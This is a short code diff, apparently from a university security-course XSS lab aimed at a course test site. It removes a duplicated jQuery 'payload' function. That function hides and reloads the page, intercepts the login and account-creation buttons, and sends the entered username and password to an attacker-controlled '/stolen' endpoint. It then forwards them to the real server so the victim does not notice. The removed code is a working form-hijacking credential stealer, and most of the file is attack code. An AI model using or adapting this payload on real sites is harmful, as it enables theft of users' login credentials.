@@ -65,29 +65,6 @@ function payload(attacker) {
 	proxy('./', attacker)
 }
 
-function payload(attacker) {
-	function proxy(href, spying_url) {
-		$('html').hide();
-		$('html').load(href, function() {
-			$('html').show();
-			$('#log-in-btn').click(function(event) {
-				event.preventDefault();
-				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
-				$.post('http://bungle-cs461.csl.illinois.edu/login', {username: $('#username').val(), password: $('#userpass').val()}, function() {
-					proxy('./', attacker);
-				});
-			});
-			$('#new-account-btn').click(function(event) {
-				event.preventDefault();
-				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
-				$.post('http://bungle-cs461.csl.illinois.edu/create', {username: $('#username').val(), password: $('#userpass').val()}, function() {
-					proxy('./', attacker);
-				});
-			});
-		});
-	}
-	proxy('./', attacker)
-}
 function makeLink(target, attacker, defense) {
 
 	// Encode your payload function as a string 
